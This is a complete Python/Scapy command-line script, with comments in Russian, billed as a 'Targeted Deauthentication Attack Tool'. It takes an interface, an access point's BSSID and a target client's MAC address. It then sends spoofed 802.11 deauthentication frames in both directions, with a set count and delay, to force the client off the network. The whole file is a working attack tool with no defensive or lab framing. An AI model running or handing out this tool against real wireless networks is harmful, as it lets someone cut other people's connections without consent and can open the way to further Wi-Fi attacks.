from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
import argparse
import time

def send_deauth(interface, ap_mac, client_mac, count, timeout=0.1):
    
    print(f"*Starting attack to {client_mac} from {interface}...")
    print(f"Target AP: {ap_mac}")
    print(f"Send {count} deauth-frame... (Ctrl+C to stop)")

    try:
        for i in range(count):
            # Deauth от имени точки доступа (AP → Client)
            pkt1 = RadioTap() / Dot11(
                addr1=client_mac,  # Получатель (клиент)
                addr2=ap_mac,     # Отправитель (AP)
                addr3=ap_mac      # BSSID (AP)
            ) / Dot11Deauth()

            # Deauth от имени клиента (Client → AP)
            pkt2 = RadioTap() / Dot11(
                addr1=ap_mac,    # Получатель (AP)
                addr2=client_mac, # Отправитель (клиент)
                addr3=ap_mac      # BSSID (AP)
            ) / Dot11Deauth()

            sendp(pkt1, iface=interface, verbose=False)
            sendp(pkt2, iface=interface, verbose=False)

            print(f"\r{i + 1}/{count} packet(s) sent.", end="")
            time.sleep(timeout)

        print("\nAttack finished!")

    except KeyboardInterrupt:
        print("\nAborted.")

def main():
    parser = argparse.ArgumentParser(description="Targeted Deauthentication Attack Tool")
    parser.add_argument("-i", "--interface", required=True, help="Interface attack from.")
    parser.add_argument("-a", "--ap", required=True, help="AP MAC-address (BSSID).")
    parser.add_argument("-c", "--client", required=True, help="Target MAC-address.")
    parser.add_argument("-n", "--count", type=int, default=10, help="Count of deauth-frame(s) (default is 10).")
    parser.add_argument("-t", "--timeout", type=float, default=0.1, help="Timeout from sending (default is 0.1 sec).")

    args = parser.parse_args()

    # Проверка MAC-адресов
    def is_valid_mac(mac):
        import re
        return re.match(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", mac)

    if not is_valid_mac(args.ap):
        print("Invalid AP MAC-address!")
        return

    if not is_valid_mac(args.client):
        print("Invalid client MAC-address!")
        return

    # Запуск атаки
    send_deauth(args.interface, args.ap.lower(), args.client.lower(), args.count, args.timeout)

if __name__ == "__main__":
    main()

